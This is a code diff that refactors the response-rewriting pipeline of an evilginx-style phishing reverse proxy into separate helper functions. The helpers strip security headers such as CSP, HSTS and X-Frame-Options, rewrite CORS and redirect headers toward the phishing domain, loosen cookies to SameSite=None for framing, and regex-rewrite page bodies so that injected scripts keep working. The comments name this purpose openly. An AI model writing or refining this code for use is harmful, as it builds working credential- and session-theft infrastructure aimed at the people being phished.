@@ -1070,28 +1070,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
-			if allow_origin != "" && allow_origin != "*" {
-				if u, err := url.Parse(allow_origin); err == nil {
-					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
-						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
-					}
-				} else {
+			if allow_origin := resp.Header.Get("Access-Control-Allow-Origin"); allow_origin != "" && allow_origin != "*" {
+				if err := rewriteAccessControlAllowOrigin(resp.Header, p.replaceHostWithPhished); err != nil {
 					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
 				}
-				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
-			var rm_headers = []string{
-				"Content-Security-Policy",
-				"Content-Security-Policy-Report-Only",
-				"Strict-Transport-Security",
-				"X-XSS-Protection",
-				"X-Content-Type-Options",
-				"X-Frame-Options",
-			}
-			for _, hdr := range rm_headers {
-				resp.Header.Del(hdr)
-			}
+			stripResponseSecurityHeaders(resp.Header, responseSecurityHeaders)
 
 			redirect_set := false
 			if s, ok := p.getSession(ps.SessionId); ok {
@@ -1105,9 +1089,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
 			if err == nil {
-				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
-					r_url.Host = r_host
-					resp.Header.Set("Location", r_url.String())
+				if u, changed := rewriteLocationURL(r_url, p.replaceHostWithPhished); changed {
+					resp.Header.Set("Location", u.String())
 				}
 			}
 
@@ -1124,22 +1107,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			resp.Header.Del("Set-Cookie")
 			for _, ck := range cookies {
 				// parse cookie
-
-				// add SameSite=none for every received cookie, allowing cookies through iframes
-				if ck.Secure {
-					ck.SameSite = http.SameSiteNoneMode
-				}
-
-				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
-					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
-					if err != nil {
-						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
-						if err != nil {
-							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
-						}
-					}
-					ck.Expires = exptime
-				}
+				normalizeResponseCookie(ck)
 
 				if pl != nil && ps.SessionId != "" {
 					c_domain := ck.Domain
@@ -1285,35 +1253,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
-									re_s := sf.regexp
-									replace_s := sf.replace
 									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
 									phish_sub, _ := p.getPhishSub(phish_hostname)
-
-									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
-									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
-									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
-									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
-									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
-									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
-									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
-									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
-									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
-									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
-									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
-									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
-									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
-									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-									if ok {
-										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
-										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
-									}
+
+									re_s := expandSubFilterPattern(sf.regexp, sf.subdomain, sf.domain, p.cfg.GetBaseDomain())
+									replace_s := expandSubFilterReplacement(sf.replace, sf.subdomain, sf.domain, p.cfg.GetBaseDomain(), phish_hostname, phish_sub, phishDomain, ok)
 
 									if re, err := regexp.Compile(re_s); err == nil {
-										body = []byte(re.ReplaceAllString(string(body), replace_s))
+										body = applySubFilterRegex(body, re, replace_s)
 									} else {
 										log.Error("regexp failed to compile: `%s`", sf.regexp)
 									}
@@ -1369,12 +1317,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
 				if jsInspectInjected {
-					resp.ContentLength = int64(len(body))
-					resp.Header.Set("Content-Length", strconv.Itoa(len(body)))
-					resp.Header.Del("ETag")
-					resp.Header.Del("Content-MD5")
-					resp.TransferEncoding = nil
-					resp.Header.Del("Transfer-Encoding")
+					setModifiedBodyFraming(resp, body)
 				}
 			}
 
@@ -1465,6 +1408,153 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	return p, nil
 }
 
+// ---------------------------------------------------------------------------
+// Response pipeline steps
+//
+// The functions below are pure extractions from the goproxy OnResponse
+// closure registered above in NewHttpProxy. Each takes its inputs
+// explicitly and returns its outputs explicitly, so they can be exercised
+// directly by pkg/proxy/core/response_pipeline_test.go without a live MITM
+// listener. This is a pure extraction: the behavior of each function is
+// identical to the inline code it replaced inside the closure - nothing
+// about what gets rewritten, or in what order, was changed here.
+// ---------------------------------------------------------------------------
+
+// responseSecurityHeaders lists the browser-enforced protections stripped
+// from every proxied response so they don't interfere with content injected
+// into the phished page (e.g. a CSP blocking the injected session script).
+var responseSecurityHeaders = []string{
+	"Content-Security-Policy",
+	"Content-Security-Policy-Report-Only",
+	"Strict-Transport-Security",
+	"X-XSS-Protection",
+	"X-Content-Type-Options",
+	"X-Frame-Options",
+}
+
+// stripResponseSecurityHeaders deletes the given header names from h.
+func stripResponseSecurityHeaders(h http.Header, headers []string) {
+	for _, hdr := range headers {
+		h.Del(hdr)
+	}
+}
+
+// rewriteAccessControlAllowOrigin rewrites a non-wildcard
+// Access-Control-Allow-Origin response header to point at the phished host
+// via replaceFn, mirroring the CORS handling evilginx performs so
+// cross-origin XHRs made by the phished page keep working. It always marks
+// credentials as allowed once called (matching legacy behavior), and
+// returns any URL parse error for the caller to log.
+func rewriteAccessControlAllowOrigin(h http.Header, replaceFn func(string) (string, bool)) error {
+	allow_origin := h.Get("Access-Control-Allow-Origin")
+	if allow_origin == "" || allow_origin == "*" {
+		return nil
+	}
+	u, err := url.Parse(allow_origin)
+	if err == nil {
+		if o_host, ok := replaceFn(u.Host); ok {
+			h.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+		}
+	}
+	h.Set("Access-Control-Allow-Credentials", "true")
+	return err
+}
+
+// rewriteLocationURL rewrites a redirect target's host to its phished
+// equivalent via replaceFn. It reports whether a rewrite was applied so the
+// caller only needs to re-serialize the Location header when it changed.
+func rewriteLocationURL(u *url.URL, replaceFn func(string) (string, bool)) (*url.URL, bool) {
+	if u == nil {
+		return u, false
+	}
+	if host, ok := replaceFn(u.Host); ok {
+		u.Host = host
+		return u, true
+	}
+	return u, false
+}
+
+// normalizeResponseCookie applies, in place, the fix-ups evilginx performs
+// on every Set-Cookie header before it's relayed to the browser: a cookie
+// marked Secure is relaxed to SameSite=None so it still works when the
+// phished page is framed, and a legacy RawExpires value that net/http
+// couldn't parse into Expires is parsed using the same fallback formats
+// tried in order (RFC850, ANSIC, then a bespoke layout).
+func normalizeResponseCookie(ck *http.Cookie) {
+	// add SameSite=none for every received cookie, allowing cookies through iframes
+	if ck.Secure {
+		ck.SameSite = http.SameSiteNoneMode
+	}
+
+	if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
+		exptime, err := time.Parse(time.RFC850, ck.RawExpires)
+		if err != nil {
+			exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
+			if err != nil {
+				exptime, _ = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
+			}
+		}
+		ck.Expires = exptime
+	}
+}
+
+// expandSubFilterPattern expands the {hostname}/{subdomain}/{domain}/...
+// macros used in a sub_filter's `regexp` pattern into their orig-site,
+// regex-escaped values.
+func expandSubFilterPattern(pattern, subdomain, domain, baseDomain string) string {
+	origHostname := combineHost(subdomain, domain)
+	pattern = strings.Replace(pattern, "{hostname}", regexp.QuoteMeta(origHostname), -1)
+	pattern = strings.Replace(pattern, "{subdomain}", regexp.QuoteMeta(subdomain), -1)
+	pattern = strings.Replace(pattern, "{domain}", regexp.QuoteMeta(domain), -1)
+	pattern = strings.Replace(pattern, "{basedomain}", regexp.QuoteMeta(baseDomain), -1)
+	pattern = strings.Replace(pattern, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(origHostname)), -1)
+	pattern = strings.Replace(pattern, "{subdomain_regexp}", regexp.QuoteMeta(subdomain), -1)
+	pattern = strings.Replace(pattern, "{domain_regexp}", regexp.QuoteMeta(domain), -1)
+	pattern = strings.Replace(pattern, "{basedomain_regexp}", regexp.QuoteMeta(baseDomain), -1)
+	return pattern
+}
+
+// expandSubFilterReplacement expands the same macro set in a sub_filter's
+// `replace` template into the phished-site values that should appear in the
+// rewritten body. phishDomainOK mirrors the phishlet.cfg.GetSiteDomain
+// lookup succeeding - the {domain}/{domain_regexp} macros are only expanded
+// when it does, exactly as in the original inline code.
+func expandSubFilterReplacement(replacement, subdomain, domain, baseDomain, phishHostname, phishSub, phishDomain string, phishDomainOK bool) string {
+	origHostname := combineHost(subdomain, domain)
+	replacement = strings.Replace(replacement, "{hostname}", phishHostname, -1)
+	replacement = strings.Replace(replacement, "{orig_hostname}", obfuscateDots(origHostname), -1)
+	replacement = strings.Replace(replacement, "{orig_domain}", obfuscateDots(domain), -1)
+	replacement = strings.Replace(replacement, "{subdomain}", phishSub, -1)
+	replacement = strings.Replace(replacement, "{basedomain}", baseDomain, -1)
+	replacement = strings.Replace(replacement, "{hostname_regexp}", regexp.QuoteMeta(phishHostname), -1)
+	replacement = strings.Replace(replacement, "{subdomain_regexp}", regexp.QuoteMeta(phishSub), -1)
+	replacement = strings.Replace(replacement, "{basedomain_regexp}", regexp.QuoteMeta(baseDomain), -1)
+	if phishDomainOK {
+		replacement = strings.Replace(replacement, "{domain}", phishDomain, -1)
+		replacement = strings.Replace(replacement, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
+	}
+	return replacement
+}
+
+// applySubFilterRegex applies a compiled sub_filter regex to body, returning
+// the rewritten bytes. A pattern that matches nothing returns the body
+// unchanged (aside from the []byte<->string round trip).
+func applySubFilterRegex(body []byte, re *regexp.Regexp, replacement string) []byte {
+	return []byte(re.ReplaceAllString(string(body), replacement))
+}
+
+// setModifiedBodyFraming updates a response's length/digest/encoding
+// headers after its body was rewritten in place, so the declared
+// Content-Length matches what will actually be written and stale
+// integrity headers (which no longer match the new body) are removed.
+func setModifiedBodyFraming(resp *http.Response, body []byte) {
+	resp.ContentLength = int64(len(body))
+	resp.Header.Set("Content-Length", strconv.Itoa(len(body)))
+	resp.Header.Del("ETag")
+	resp.Header.Del("Content-MD5")
+	resp.TransferEncoding = nil
+	resp.Header.Del("Transfer-Encoding")
+}
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 
 	s, ok := p.getSession(session_id)
